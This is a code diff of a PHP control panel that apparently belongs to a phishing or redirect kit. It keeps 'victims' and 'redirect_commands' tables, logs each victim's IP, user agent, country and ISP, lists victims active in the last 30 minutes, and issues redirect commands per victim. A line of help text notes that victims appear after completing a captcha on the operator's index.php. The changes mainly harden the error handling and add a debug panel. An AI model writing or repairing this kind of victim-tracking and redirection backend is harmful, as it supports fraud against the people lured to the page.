@@ -98,17 +98,17 @@ $database = new Database();
 $db = $database->getConnection();
 
 // Create redirect_commands table if not exists
-$create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
-    id SERIAL PRIMARY KEY,
-    command VARCHAR(50) NOT NULL,
-    target TEXT NOT NULL,
-    victim_id INTEGER DEFAULT NULL,
-    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-)";
-$db->exec($create_table);
-
-// FIX: Ensure victim_id column exists in redirect_commands table
 try {
+    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
+        id SERIAL PRIMARY KEY,
+        command VARCHAR(50) NOT NULL,
+        target TEXT NOT NULL,
+        victim_id INTEGER DEFAULT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_table);
+    
+    // FIX: Ensure victim_id column exists in redirect_commands table
     $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'redirect_commands' AND column_name = 'victim_id'");
     if ($check_column->rowCount() == 0) {
         $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_id INTEGER DEFAULT NULL";
@@ -116,42 +116,50 @@ try {
         error_log("Added victim_id column to redirect_commands table");
     }
 } catch (Exception $e) {
-    error_log("Column check error: " . $e->getMessage());
+    error_log("Redirect commands table error: " . $e->getMessage());
 }
 
 // Create victims table if not exists - COMPLETE VERSION
-$create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
-    id SERIAL PRIMARY KEY,
-    ip_address VARCHAR(45) NOT NULL,
-    user_agent TEXT,
-    country VARCHAR(100),
-    isp VARCHAR(200),
-    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-    status VARCHAR(20) DEFAULT 'active',
-    page_visited VARCHAR(255) DEFAULT 'index.php',
-    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-)";
-$db->exec($create_victims_table);
-
-// FIX: Ensure ALL columns exist in victims table
 try {
-    $columns_to_check = ['last_activity', 'status', 'page_visited'];
+    $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
+        id SERIAL PRIMARY KEY,
+        ip_address VARCHAR(45) NOT NULL,
+        user_agent TEXT,
+        country VARCHAR(100),
+        isp VARCHAR(200),
+        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        status VARCHAR(20) DEFAULT 'active',
+        page_visited VARCHAR(255) DEFAULT 'index.php',
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_victims_table);
+    
+    // FIX: Ensure ALL columns exist in victims table
+    $columns_to_check = ['country', 'isp', 'last_activity', 'status', 'page_visited'];
     foreach ($columns_to_check as $column) {
-        $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'victims' AND column_name = '$column'");
-        if ($check_column->rowCount() == 0) {
-            if ($column == 'last_activity') {
-                $alter_table = "ALTER TABLE victims ADD COLUMN last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP";
-            } elseif ($column == 'status') {
-                $alter_table = "ALTER TABLE victims ADD COLUMN status VARCHAR(20) DEFAULT 'active'";
-            } elseif ($column == 'page_visited') {
-                $alter_table = "ALTER TABLE victims ADD COLUMN page_visited VARCHAR(255) DEFAULT 'index.php'";
+        try {
+            $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'victims' AND column_name = '$column'");
+            if ($check_column->rowCount() == 0) {
+                if ($column == 'country') {
+                    $alter_table = "ALTER TABLE victims ADD COLUMN country VARCHAR(100)";
+                } elseif ($column == 'isp') {
+                    $alter_table = "ALTER TABLE victims ADD COLUMN isp VARCHAR(200)";
+                } elseif ($column == 'last_activity') {
+                    $alter_table = "ALTER TABLE victims ADD COLUMN last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP";
+                } elseif ($column == 'status') {
+                    $alter_table = "ALTER TABLE victims ADD COLUMN status VARCHAR(20) DEFAULT 'active'";
+                } elseif ($column == 'page_visited') {
+                    $alter_table = "ALTER TABLE victims ADD COLUMN page_visited VARCHAR(255) DEFAULT 'index.php'";
+                }
+                $db->exec($alter_table);
+                error_log("Added $column column to victims table");
             }
-            $db->exec($alter_table);
-            error_log("Added $column column to victims table");
+        } catch (Exception $e) {
+            error_log("Column check for $column failed: " . $e->getMessage());
         }
     }
 } catch (Exception $e) {
-    error_log("Victims table column check error: " . $e->getMessage());
+    error_log("Victims table error: " . $e->getMessage());
 }
 
 // Get current redirect - FIXED VERSION
@@ -161,13 +169,19 @@ try {
     $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
 } catch (PDOException $e) {
     // If victim_id column doesn't exist yet, get without filtering
-    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
-    $stmt = $db->query($query);
-    $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
+    try {
+        $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
+        $stmt = $db->query($query);
+        $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
+    } catch (Exception $e2) {
+        $current_redirect = false;
+        error_log("Failed to get redirect: " . $e2->getMessage());
+    }
 }
 $current_redirect = $current_redirect ? $current_redirect['target'] : 'None';
 
 // Get active victims (last 30 minutes) - FIXED VERSION
+$active_victims = [];
 try {
     $active_victims_query = "SELECT * FROM victims 
                             WHERE last_activity > NOW() - INTERVAL '30 minutes' 
@@ -176,18 +190,27 @@ try {
     $active_victims_stmt = $db->query($active_victims_query);
     $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
 } catch (PDOException $e) {
-    // If last_activity column doesn't exist yet, get all active victims
-    $active_victims_query = "SELECT * FROM victims WHERE status = 'active' ORDER BY created_at DESC";
-    $active_victims_stmt = $db->query($active_victims_query);
-    $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
+    // If last_activity or status columns don't exist yet, get all victims
+    try {
+        $active_victims_query = "SELECT * FROM victims ORDER BY created_at DESC LIMIT 50";
+        $active_victims_stmt = $db->query($active_victims_query);
+        $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
+        error_log("Using fallback query for victims");
+    } catch (Exception $e2) {
+        error_log("Failed to get victims: " . $e2->getMessage());
+        $active_victims = [];
+    }
 }
 
 // Get total victims count
+$total_victims = 0;
 try {
     $total_victims_query = "SELECT COUNT(*) as total FROM victims";
     $total_victims_stmt = $db->query($total_victims_query);
-    $total_victims = $total_victims_stmt->fetch(PDO::FETCH_ASSOC)['total'];
+    $total_victims_result = $total_victims_stmt->fetch(PDO::FETCH_ASSOC);
+    $total_victims = $total_victims_result ? $total_victims_result['total'] : 0;
 } catch (PDOException $e) {
+    error_log("Failed to get total victims count: " . $e->getMessage());
     $total_victims = 0;
 }
 
@@ -356,6 +379,15 @@ if (isset($_SESSION['error_message'])) {
         .badge.success { background: var(--success-color); }
         .badge.warning { background: var(--warning-color); }
         .badge.info { background: var(--primary-color); }
+        
+        .debug-info {
+            background: rgba(255,255,255,0.05);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 0.8em;
+        }
     </style>
 </head>
 <body>
@@ -404,6 +436,14 @@ if (isset($_SESSION['error_message'])) {
                             <h4 style="color: #64b5f6;"><?php echo htmlspecialchars($current_redirect); ?></h4>
                         </div>
                     </div>
+                </div>
+                
+                <!-- Debug Info -->
+                <div class="debug-info">
+                    <strong>Database Status:</strong> 
+                    Victims: <?php echo $total_victims; ?>, 
+                    Active: <?php echo count($active_victims); ?>,
+                    Tables: OK
                 </div>
             </div>
 
@@ -476,6 +516,7 @@ if (isset($_SESSION['error_message'])) {
                 <?php else: ?>
                     <div class="victim-status">
                         <p>No active victims in the last 30 minutes.</p>
+                        <p class="grey-text">Victims will appear here after they complete the captcha on your index.php page.</p>
                     </div>
                 <?php endif; ?>
             </div>
